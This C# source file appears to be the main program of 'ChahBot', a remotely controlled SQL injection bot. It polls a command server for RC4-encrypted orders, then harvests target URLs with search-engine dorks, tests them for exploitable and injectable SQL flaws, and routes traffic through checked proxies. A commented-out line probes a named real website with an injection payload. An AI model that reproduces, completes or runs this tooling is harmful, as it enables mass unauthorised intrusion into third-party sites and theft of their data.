using ChahBot_1_0_Gacy.Controller;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace ChahBot_1_0_Gacy
{
    class Program
    {
        private static Hashtable urls = new Hashtable();
        public struct searchEngines
        {
            public bool Google;
            public bool Bing;
            public bool Yahoo;
            public bool Aol;
            public bool Yandex;
            public bool Ask;
            public bool Wow;
            public bool WebCrawler;
            public bool MyWebSearch;
            public bool Sapo;
        }
        private static System.Timers.Timer _timer;
        public static void Main(string[] args)
        {
           /* DumperUrl dmp = new DumperUrl();
            dmp.serverInfo("http://www.salut.ru/ViewTopic.php?Id=663' and [t] and '1'='1");*/
            _timer = new System.Timers.Timer();
            _timer.Interval = Config.Config.TIME_REFRESH;
            _timer.Elapsed += new System.Timers.ElapsedEventHandler(_timer_Elapsed);
            _timer.Enabled = true;

            Application.Run();

            Console.WriteLine("Execution Terminer");
            Console.ReadKey();
        }

        private static void _timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            _timer.Stop();
            string dJson = getData(Config.Config.url("order/get"));

            var serializer = new JavaScriptSerializer();
            dynamic dataCrypted = serializer.DeserializeObject(dJson);

            if (!string.IsNullOrEmpty(dataCrypted["d"]))
            {
                dJson = EncryptionRC4.Decrypt(Config.Config.ENCRYPTION_KEY, dataCrypted["d"]);
                dynamic data = serializer.DeserializeObject(dJson);
                
               /* try
                {*/
                    if (data["error"] == true)
                    {
                        if (!string.IsNullOrEmpty(data["message"]))
                        {
                            Console.WriteLine("Erreeur: " + data["message"]);
                        }
                        else
                        {
                            Console.WriteLine("Erreur");
                        }
                        Thread.Sleep(5000);
                        goto GO_toNoTask;
                    }
                    if (data["available"] == false)
                    {
                        goto GO_toNoTask;
                    }
                    dynamic order = data["order"];
                    order["id"] = data["id"];
                    order["date_created"] = data["date_created"];

                    setProxyConfig(order);

                    string task_name = Convert.ToString(order["name"]);
                    switch (task_name)
                    {
                        case "search_urls":
                        {
                            Console.WriteLine("Start Scanne Dorks... ");
                            ScannerDork dScanne = new ScannerDork();
                            string dork_lines = Convert.ToString(order["dorks"]);
                            string[] dorks = dork_lines.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                            Console.WriteLine(dorks.Length + " => Dorks");

                            searchEngines sE = new searchEngines();
                            sE.Aol = (order["aol"] == "1") ? true : false;
                            sE.Ask = (order["ask"] == "1") ? true : false;
                            sE.Bing = (order["bing"] == "1") ? true : false;
                            sE.Google = (order["google"] == "1") ? true : false;
                            sE.MyWebSearch = (order["myWebSearch"] == "1") ? true : false;
                            sE.Sapo = (order["sapo"] == "1") ? true : false;
                            sE.WebCrawler = (order["webCrawler"] == "1") ? true : false;
                            sE.Wow = (order["wow"] == "1") ? true : false;
                            sE.Yahoo = (order["yahoo"] == "1") ? true : false;
                            sE.Yandex = (order["yandex"] == "1") ? true : false;

                            Config.Config.excludeUrlWords = order["excludeUrlWords"];

                            int timeout = Convert.ToInt16(order["timeout"]);
                            int numDelay = Convert.ToInt16(order["numDelay"]);

                            dScanne.StartWorker(order, timeout, numDelay, dorks.ToList(), 10, 5, sE.Google, sE.Bing, sE.Yahoo, sE.Aol, sE.Yandex, sE.Ask, sE.Wow, sE.WebCrawler, sE.MyWebSearch, sE.Sapo);
                        }
                        break;
                        case "scanner_urls":
                        {
                            Console.WriteLine("Start Analyse If Exploitable...");

                            dJson = getData(Config.Config.url("sqli/urls?max=" + order["numMaxUrls"]));
                            dynamic dUrlsWrap = serializer.DeserializeObject(dJson);
                            dJson = EncryptionRC4.Decrypt(Config.Config.ENCRYPTION_KEY, dUrlsWrap["d"]);
                            dUrlsWrap = serializer.DeserializeObject(dJson);

                            AnalyserUrls uAnalyser = new AnalyserUrls();
                            Hashtable urlsHashtable = new Hashtable();

                            foreach (var url in dUrlsWrap["urls"])
                            {
                                if (!urlsHashtable.ContainsValue(url))
                                {
                                    urlsHashtable.Add(url, url);
                                }
                            }
                            int timeout = Convert.ToInt16(order["timeout"]);
                            int numDelay = Convert.ToInt16(order["numDelay"]);
                            int numThread = Convert.ToInt16(order["numThread"]);

                            uAnalyser.StartWorker(order, timeout, numDelay, numThread, urlsHashtable);
                        }
                        break;
                        case "analyse_exploitables":
                        {
                            Console.WriteLine("Start Analyse If Injectable...");

                            dJson = getData(Config.Config.url("sqli/exploitables?max=" + order["numMaxUrls"]));
                            dynamic dExploitablesWrap = serializer.DeserializeObject(dJson);
                            dJson = EncryptionRC4.Decrypt(Config.Config.ENCRYPTION_KEY, dExploitablesWrap["d"]);
                            dExploitablesWrap = serializer.DeserializeObject(dJson);

                            InjecterUrls uInjecter = new InjecterUrls();
                            Hashtable exploitablesHashtable = new Hashtable();

                            foreach (dynamic obj in dExploitablesWrap["exploitables"])
                            {
                                if (!exploitablesHashtable.ContainsValue(obj))
                                {
                                    exploitablesHashtable.Add(obj["url"], new { url = obj["url"], sql_type = obj["sql_type"] });
                                }
                            }
                            int timeout = Convert.ToInt16(order["timeout"]);
                            int numDelay = Convert.ToInt16(order["numDelay"]);
                            int numThread = Convert.ToInt16(order["numThread"]);

                            uInjecter.StartWorker(order, exploitablesHashtable, timeout, numDelay, numThread);
                        }
                        break;
                        case "analyse_urls_queue":
                        {
                            Console.WriteLine("Start Analyse URLS QUEUE If Exploitable Injectable...");

                            dJson = getData(Config.Config.url("sqli/urls_queue?max=" + order["numMaxUrls"]));
                            dynamic dQueueWrap = serializer.DeserializeObject(dJson);
                            dJson = EncryptionRC4.Decrypt(Config.Config.ENCRYPTION_KEY, dQueueWrap["d"]);
                            dQueueWrap = serializer.DeserializeObject(dJson);

                            InjecterUrlsQueue uInjecter = new InjecterUrlsQueue();
                            Hashtable urlsQueueHashtable = new Hashtable();

                            foreach (dynamic obj in dQueueWrap["urls_queue"])
                            {
                                if (!urlsQueueHashtable.ContainsValue(obj))
                                {
                                    urlsQueueHashtable.Add(obj["url"], new { url = obj["url"], email_submitter = obj["email"], ip_submitter = obj["ip"] });
                                }
                            }
                            int timeout = Convert.ToInt16(order["timeout"]);
                            int numDelay = Convert.ToInt16(order["numDelay"]);
                            int numThread = Convert.ToInt16(order["numThread"]);

                            uInjecter.StartWorker(order, urlsQueueHashtable, timeout, numDelay, numThread);
                        }
                        break;
                        case "proxy_checks":
                        {
                            Globals.UpDateStatus(order, "Proxy Checker", "Checker thread, loading please wait..");
                            setProxyConfig(order);
                        }
                        break;
                    }
                    Thread.Sleep(5000);  
                /*} catch(Exception ex) {
                    throw ex;
                }*/

            GO_toNoTask:
                Thread.Sleep(1000);   
            }

            _timer.Start();
        }
        /*SearchClass.SearchEngineUrls seu = new SearchClass.SearchEngineUrls(SearchClass.SearchEngineUrls.Host.Google, 1, 50000000);
             seu.StartScanning(dorks, 1, 1000);*/

        private static void setProxyConfig(dynamic order)
        {
            try
            {
                int val = Convert.ToInt16(order["proxy"]);
                bool active = val == 1 ? true : false;
                if (active)
                {
                    var serializer = new JavaScriptSerializer();
                    Console.WriteLine("Getting proxy... ");
                    string dJson = getData(Config.Config.url("proxy/get"));
                    dynamic dUrlsWrap = serializer.DeserializeObject(dJson);
                    dJson = EncryptionRC4.Decrypt(Config.Config.ENCRYPTION_KEY, dUrlsWrap["d"]);
                    dUrlsWrap = serializer.DeserializeObject(dJson);
                    int nbr = Convert.ToInt16(dUrlsWrap["proxy"].Length);
                    Thread[] Threads = new Thread[nbr];

                    Console.WriteLine("Set settings proxy... ");

                    int i = 0;
                    foreach (var proxy in dUrlsWrap["proxy"])
                    {
                        string sHtml = "";
                        string sCode = "";

                        Threads[i] = new Thread(() =>
                        {
                            try
                            {
                                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://www.google.com/");
                                WebProxy wProxy = new WebProxy(proxy["ip"] + ":" + proxy["port"]);
                                request.Proxy = wProxy;
                                request.Method = "GET";
                                request.Timeout = 5000;
                                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                                sCode = response.StatusCode.ToString();
                                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                                {
                                    sHtml = reader.ReadToEnd();
                                }

                                if (sCode.Contains("OK") && !string.IsNullOrEmpty(sHtml))
                                {
                                    if (!Globals.G_Proxy.__List.Contains(wProxy))
                                    {
                                        Globals.G_Proxy.__List.Add(wProxy);
                                    }
                                    Console.WriteLine("GOOD Proxy =>" + proxy["ip"] + ":" + proxy["port"]);
                                }
                            }
                            catch (Exception)
                            {
                                Globals.GUI.sendProxyStatus(order, new { ip = proxy["ip"], port = proxy["port"], status = false });
                                Console.WriteLine("Bad Proxy => " + proxy["ip"] + ":" + proxy["port"]);
                            }
                        });
                        Threads[i].Start();
                        i++;
                    }

                    if (i == 0)
                    {
                        Globals.UpDateStatus(order, "Proxy Checker", "No Proxy found");
                        return;
                    }

                    for (int a = 0; a < nbr; a++)
                    {
                        Threads[a].Join();
                    }

                   
                    if (Globals.G_Proxy.__List.Count > 0)
                    {
                        Globals.G_Proxy.Enable = true;
                        Globals.G_Proxy.__IsList = true;
                        Globals.UpDateStatus(order, "Proxy Checker", Globals.G_Proxy.__List.Count + "Proxy live, Thread Done");
                    }
                }
                else
                {
                    Globals.G_Proxy.Enable = false;
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public static string getData(string url)
        {
            var requete = (HttpWebRequest)WebRequest.Create(url);
            requete.UserAgent = Config.Config.MAIN_USER_AGENT;
            requete.CookieContainer = new CookieContainer();
            requete.AllowAutoRedirect = true;
            requete.KeepAlive = true;
            requete.Headers.Add("Authorization", Config.Config.API_KEY);

            var reponseString = "";

            for (int t = 0; t < 3; t++)
            {
                try
                {
                    using (var response = (HttpWebResponse)requete.GetResponse())
                    {
                        reponseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                        break;
                    }
                } catch (Exception ex) {
                    throw ex;
                }
            }
            return reponseString;
        }
    }
}
